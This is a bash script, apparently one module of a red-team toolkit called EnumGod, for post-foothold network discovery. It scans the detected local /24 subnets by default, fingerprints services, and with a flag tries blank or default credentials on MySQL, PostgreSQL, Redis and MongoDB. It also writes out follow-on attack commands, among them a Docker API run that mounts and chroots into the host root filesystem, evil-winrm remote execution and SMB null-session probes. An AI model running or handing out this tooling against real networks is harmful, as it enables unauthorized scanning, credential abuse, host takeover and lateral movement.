#!/usr/bin/env bash
# EnumGod - Red Team Enumeration Toolkit   |   Author: Jeet Ramoliya
# ============================================================================
# net-sweep.sh  -  Red Team NETWORK discovery, service fingerprint & DB triage
#                  from a *nix foothold. Same ranked findings model as the kit.
#
# WHAT IT DOES  (ACTIVE - touches other hosts; see noise posture)
#   1. Discover live hosts on the local subnet(s) (or a target you pass).
#   2. TCP-connect scan a curated red-team port list; grab banners.
#   3. Fingerprint & flag: SMB/NFS/FTP-anon, LDAP, RDP/WinRM, web, and
#      databases (MSSQL/MySQL/PostgreSQL/Oracle/MongoDB/Redis).
#   4. Optional --db: test *default/blank* creds on reachable DBs using
#      installed clients only (conservative, well-known defaults).
#
# ENGINE   nmap if present (faster, better); otherwise pure-bash /dev/tcp.
#
# NOISE    Port scanning is active and detectable. Default sweeps the detected
#          /24(s). Use -t to scope, --self to only inventory THIS host, and
#          --loud for the full port range. DB cred tests run ONLY with --db.
#
# USAGE
#   ./net-sweep.sh                      # discover + scan detected /24(s)
#   ./net-sweep.sh -t 10.0.0.0/24       # scope to a target CIDR / host / list
#   ./net-sweep.sh -t 10.0.0.5 --loud --db -j
#   ./net-sweep.sh --self               # local interfaces/listeners only (quiet)
# ============================================================================
set -u

TARGET=""; OUTBASE="."; JSON=0; LOUD=0; DBCHK=0; SELF=0
while [ $# -gt 0 ]; do
  case "$1" in
    -t|--target) TARGET="$2"; shift 2;;
    --loud) LOUD=1; shift;;
    --db) DBCHK=1; shift;;
    --self) SELF=1; shift;;
    -o) OUTBASE="$2"; shift 2;;
    -j|--json) JSON=1; shift;;
    -h|--help) grep '^#' "$0" | sed 's/^# \{0,1\}//'; exit 0;;
    *) echo "unknown arg: $1"; exit 1;;
  esac
done

HOST=$(hostname 2>/dev/null || echo host); TS=$(date +%Y%m%d_%H%M%S)
RUN="${OUTBASE%/}/netsweep_${HOST}_${TS}"; mkdir -p "$RUN" 2>/dev/null || { echo "[-] cannot create $RUN"; exit 1; }
if [ -t 1 ]; then R=$'\e[31m';Y=$'\e[33m';C=$'\e[36m';G=$'\e[32m';D=$'\e[90m';N=$'\e[0m'; else R=;Y=;C=;G=;D=;N=; fi
SUMMARY="$RUN/00_SUMMARY.txt"; NEXT="$RUN/NEXT_STEPS.txt"; JFILE="$RUN/findings.json"
: > "$SUMMARY"; : > "$NEXT"; HIGHN=0;MEDN=0;INFON=0
declare -a J_HIGH=() J_MED=() J_INFO=() J_NEXT=()
sect(){ printf '\n%s[==== %s ====]%s\n' "$C" "$1" "$N"; }
flag(){ sev="$1";shift;txt="$*";case "$sev" in
  HIGH)col=$R;tag="[HIGH]";HIGHN=$((HIGHN+1));J_HIGH+=("$txt");;
  MED)col=$Y;tag="[MED ]";MEDN=$((MEDN+1));J_MED+=("$txt");;
  *)col=$D;tag="[INFO]";INFON=$((INFON+1));J_INFO+=("$txt");;esac
  printf '%s%s %s%s\n' "$col" "$tag" "$txt" "$N"; printf '%s %s\n' "$tag" "$txt" >> "$SUMMARY"; }
nextstep(){ printf '[*] %s\n    %s\n\n' "$1" "$2" >> "$NEXT"; J_NEXT+=("$1 :: $2"); }
save(){ cat > "$RUN/$1"; }
has(){ command -v "$1" >/dev/null 2>&1; }

# curated port -> label map
PORTS_QUICK="21 22 23 25 53 80 110 111 135 139 143 389 443 445 636 993 995 1433 1521 2049 3306 3389 5432 5900 5985 5986 6379 8080 8443 9200 11211 27017"
PORTS_LOUD="$PORTS_QUICK 20 69 88 123 161 465 514 587 623 873 1080 1099 2121 2375 2376 3000 3690 4444 5000 5044 5601 5672 6000 6443 7001 8000 8081 8089 8888 9000 9090 9443 10000 50070"
label(){ case "$1" in
  21)echo FTP;;22)echo SSH;;23)echo Telnet;;25)echo SMTP;;53)echo DNS;;80|8080|8000|3000|5000)echo HTTP;;
  110)echo POP3;;111)echo RPCbind;;135)echo MSRPC;;139|445)echo SMB;;143)echo IMAP;;389)echo LDAP;;
  443|8443|9443)echo HTTPS;;636)echo LDAPS;;993)echo IMAPS;;1433)echo MSSQL;;1521)echo "Oracle-TNS";;
  2049)echo NFS;;2375|2376)echo "Docker-API";;3306)echo MySQL;;3389)echo RDP;;5432)echo PostgreSQL;;
  5900)echo VNC;;5985)echo "WinRM-HTTP";;5986)echo "WinRM-HTTPS";;6379)echo Redis;;6443)echo "K8s-API";;
  9200)echo Elasticsearch;;11211)echo Memcached;;27017)echo MongoDB;;623)echo IPMI;;873)echo rsync;;161)echo SNMP;;
  *)echo "tcp/$1";; esac; }

# tcp connect test with timeout; prints OPEN if port reachable
tcpopen(){ h="$1"; p="$2"
  if has timeout; then timeout 2 bash -c ">/dev/tcp/$h/$p" 2>/dev/null && echo OPEN
  else (bash -c ">/dev/tcp/$h/$p" 2>/dev/null) & pid=$!; (sleep 2; kill $pid 2>/dev/null) & wait $pid 2>/dev/null && echo OPEN; fi; }

enumgod_banner(){
  printf '%s' "${C:-}"
  cat <<'ART'
 _____                        ____           _
| ____|_ __  _   _ _ __ ___  / ___| ___   __| |
|  _| | '_ \| | | | '_ ` _ \| |  _ / _ \ / _` |
| |___| | | | |_| | | | | | | |_| | (_) | (_| |
|_____|_| |_|\__,_|_| |_| |_|\____|\___/ \__,_|
ART
  printf '%s   EnumGod  Red Team Enumeration Toolkit%s\n' "${G:-}" "${N:-}"
  printf '%s   author : Jeet Ramoliya   module : %s%s\n\n' "${D:-}" "$1" "${N:-}"
}
enumgod_banner "network discovery & services"
echo "${G}[*] net-sweep  ->  $RUN${N}"

# ----------------------------- local inventory -----------------------------
sect "Local interfaces, routes & neighbours"
{
  echo "== interfaces =="; (ip -o -4 addr 2>/dev/null || ifconfig -a 2>/dev/null)
  echo; echo "== routes =="; (ip r 2>/dev/null || route -n 2>/dev/null)
  echo; echo "== arp neighbours =="; (ip neigh 2>/dev/null || arp -a 2>/dev/null)
} | save 01_local.txt
# derive local /24 CIDRs
CIDRS=$(ip -o -4 addr 2>/dev/null | awk '{print $4}' | grep -v '^127\.' )
[ -n "$CIDRS" ] && flag INFO "Local networks: $(echo "$CIDRS" | tr '\n' ' ')"
# known neighbours = free targets
ip neigh 2>/dev/null | awk '/REACHABLE|STALE/{print $1}' | sort -u | save 01b_neighbours.txt

if [ "$SELF" = "1" ]; then
  flag INFO "--self: local inventory only, no scanning."
else
  # build target host list
  if [ -z "$TARGET" ]; then
    # default: the detected /24(s)
    for c in $CIDRS; do
      base=$(echo "$c" | cut -d/ -f1); pfx=$(echo "$c" | cut -d/ -f2)
      if [ "${pfx:-0}" -ge 24 ] 2>/dev/null; then TARGET="$TARGET ${base%.*}.0/24"; fi
    done
    TARGET=$(echo "$TARGET" | xargs)
    [ -n "$TARGET" ] && flag INFO "No -t given; defaulting to detected subnet(s): $TARGET"
  fi

  if [ -z "$TARGET" ]; then
    flag INFO "No target subnet detected - pass -t <cidr|host|list>."
  else
    # expand targets into host list (nmap handles CIDR; bash path expands /24 only)
    PORTS="$PORTS_QUICK"; [ "$LOUD" = "1" ] && PORTS="$PORTS_LOUD"

    sect "Host & port sweep ($([ "$LOUD" = 1 ] && echo loud || echo quick)) [ACTIVE]"
    if has nmap; then
      flag INFO "Using nmap for the sweep."
      PLIST=$(echo "$PORTS" | tr ' ' ',')
      nmap -Pn -sT -n --open -p "$PLIST" $TARGET -oG "$RUN/02_nmap.gnmap" 2>/dev/null | save 02_nmap.txt
      # parse open ports
      grep -h 'Ports:' "$RUN/02_nmap.gnmap" 2>/dev/null | while read -r line; do
        ip=$(echo "$line" | awk '{print $2}')
        echo "$line" | grep -oE '[0-9]+/open' | cut -d/ -f1 | while read -r p; do echo "$ip $p $(label $p)"; done
      done | save 03_services.txt
    else
      flag INFO "nmap absent - using bash /dev/tcp (slower). Scanning up to 256 hosts/subnet."
      : > "$RUN/03_services.txt"
      for t in $TARGET; do
        if echo "$t" | grep -q '/24$'; then net=$(echo "$t" | sed 's#\.0/24##'); hosts=$(seq -f "$net.%g" 1 254)
        elif echo "$t" | grep -q ','; then hosts=$(echo "$t" | tr ',' ' ')
        else hosts="$t"; fi
        for h in $hosts; do
          for p in $PORTS; do
            [ "$(tcpopen "$h" "$p")" = "OPEN" ] && echo "$h $p $(label $p)" | tee -a "$RUN/03_services.txt"
          done
        done
      done >/dev/null
    fi

    # ---------- interpret findings ----------
    if [ -s "$RUN/03_services.txt" ]; then
      OPENH=$(awk '{print $1}' "$RUN/03_services.txt" | sort -u | wc -l)
      flag INFO "Live hosts with open ports: $OPENH (see 03_services.txt)."
      # high-value / unauth-prone services
      grep -qw 6379 "$RUN/03_services.txt" && { flag HIGH "Redis (6379) exposed - often unauthenticated -> RCE via config set/module."; nextstep "Redis unauth" "redis-cli -h <ip> ping; info; config get dir"; }
      grep -qw 2375 "$RUN/03_services.txt" && { flag HIGH "Docker API (2375) exposed - unauth -> host root via container."; nextstep "Docker API" "docker -H tcp://<ip>:2375 run -v /:/mnt --rm -it alpine chroot /mnt sh"; }
      grep -qw 2049 "$RUN/03_services.txt" && { flag HIGH "NFS (2049) exposed - check exports for no_root_squash."; nextstep "NFS exports" "showmount -e <ip>"; }
      grep -qw 445  "$RUN/03_services.txt" && { flag MED "SMB (445) hosts present - test null/guest sessions & signing."; nextstep "SMB triage" "netexec smb <ip> -u '' -p '' --shares; nmap --script smb-security-mode -p445 <ip>"; }
      grep -qw 389  "$RUN/03_services.txt" && { flag MED "LDAP (389) hosts present - run directory/ldap-enum.sh against them."; nextstep "LDAP enum" "./directory/ldap-enum.sh -H ldap://<ip>"; }
      grep -qw 1521 "$RUN/03_services.txt" && flag MED "Oracle TNS (1521) present - SID bruteforce / odat."
      grep -qw 161  "$RUN/03_services.txt" && flag MED "SNMP (161) present - try community 'public' (snmpwalk)."
      grep -qw 9200 "$RUN/03_services.txt" && flag MED "Elasticsearch (9200) - often unauth; GET /_cat/indices."
      grep -qw 27017 "$RUN/03_services.txt" && flag MED "MongoDB (27017) - often unauth; mongo --eval 'db.adminCommand({listDatabases:1})'."
      grep -qw 11211 "$RUN/03_services.txt" && flag MED "Memcached (11211) - unauth data dump (stats items)."
      grep -Eqw '5985|5986' "$RUN/03_services.txt" && { flag MED "WinRM present - creds -> remote exec (evil-winrm)."; nextstep "WinRM" "evil-winrm -i <ip> -u user -p pass"; }
      grep -qw 3389 "$RUN/03_services.txt" && flag INFO "RDP (3389) hosts present (lateral target with creds)."
      grep -qw 21   "$RUN/03_services.txt" && { flag MED "FTP (21) present - test anonymous login."; nextstep "FTP anon" "curl -s ftp://anonymous:anon@<ip>/ ; "; }
      awk '{print $3}' "$RUN/03_services.txt" | grep -qE 'HTTP|HTTPS' && flag INFO "Web services present - screenshot & dirbust (gowitness / feroxbuster)."
    else
      flag INFO "No open ports found on the scanned range."
    fi
  fi
fi

# ----------------------------- DB default-cred checks (opt-in) -----------------------------
if [ "$DBCHK" = "1" ] && [ -s "$RUN/03_services.txt" ]; then
  sect "Database default/blank credential checks [ACTIVE, opt-in]"
  # MySQL root blank
  if has mysql; then
    awk '$2==3306{print $1}' "$RUN/03_services.txt" | sort -u | while read -r ip; do
      mysql -h "$ip" -u root --connect-timeout=4 -e 'select version();' >/dev/null 2>&1 && flag HIGH "MySQL root with BLANK password on $ip."
    done
  fi
  # PostgreSQL default
  if has psql; then
    awk '$2==5432{print $1}' "$RUN/03_services.txt" | sort -u | while read -r ip; do
      PGPASSWORD=postgres psql -h "$ip" -U postgres -c 'select version();' >/dev/null 2>&1 && flag HIGH "PostgreSQL postgres:postgres on $ip."
    done
  fi
  # Redis no-auth
  if has redis-cli; then
    awk '$2==6379{print $1}' "$RUN/03_services.txt" | sort -u | while read -r ip; do
      [ "$(redis-cli -h "$ip" -t 3 ping 2>/dev/null)" = "PONG" ] && flag HIGH "Redis on $ip answers unauthenticated (PONG)."
    done
  fi
  # MongoDB no-auth
  if has mongosh || has mongo; then
    MG=$(command -v mongosh || command -v mongo)
    awk '$2==27017{print $1}' "$RUN/03_services.txt" | sort -u | while read -r ip; do
      "$MG" "mongodb://$ip:27017" --quiet --eval 'db.adminCommand({listDatabases:1})' >/dev/null 2>&1 && flag HIGH "MongoDB on $ip allows unauthenticated admin commands."
    done
  fi
fi

# ----------------------------- summary -----------------------------
sect "Writing ranked summary"
{
  echo "net-sweep summary - $HOST - $(date)"
  echo "Target: ${TARGET:-<self/none>}   mode: $([ "$LOUD" = 1 ] && echo loud || echo quick)   db-checks: $DBCHK"
  echo
  echo "### HIGH ($HIGHN) ###"; printf '%s\n' "${J_HIGH[@]:-}"
  echo; echo "### MED ($MEDN) ###"; printf '%s\n' "${J_MED[@]:-}"
  echo; echo "### INFO ($INFON) ###"; printf '%s\n' "${J_INFO[@]:-}"
  echo; echo "=== RECOMMENDED NEXT MOVE ==="
  if [ -s "$NEXT" ]; then head -2 "$NEXT" | sed 's/^\[\*\] /-> /'; else echo "-> Review 03_services.txt; pick a service and pivot (SMB/LDAP/DB/web)."; fi
} > "$SUMMARY"

if [ "$JSON" = "1" ]; then
  jarr(){ printf '['; first=1; shift; for e in "$@"; do [ $first -eq 1 ]||printf ','; first=0; printf '%s' "$e" | sed 's/\\/\\\\/g;s/"/\\"/g' | awk '{printf "\"%s\"",$0}'; done; printf ']'; }
  { printf '{\n  "host":"%s","target":"%s","ts":"%s",\n' "$HOST" "${TARGET:-}" "$TS"
    printf '  "high":'; jarr x "${J_HIGH[@]:-}"; printf ',\n  "med":'; jarr x "${J_MED[@]:-}"; printf ',\n  "info":'; jarr x "${J_INFO[@]:-}"; printf ',\n  "next_steps":'; jarr x "${J_NEXT[@]:-}"; printf '\n}\n'; } > "$JFILE"
fi

echo; echo "${G}[+] Done. HIGH=$HIGHN MED=$MEDN INFO=$INFON${N}"
echo "${G}[+] Read: $SUMMARY  and  $NEXT${N}"
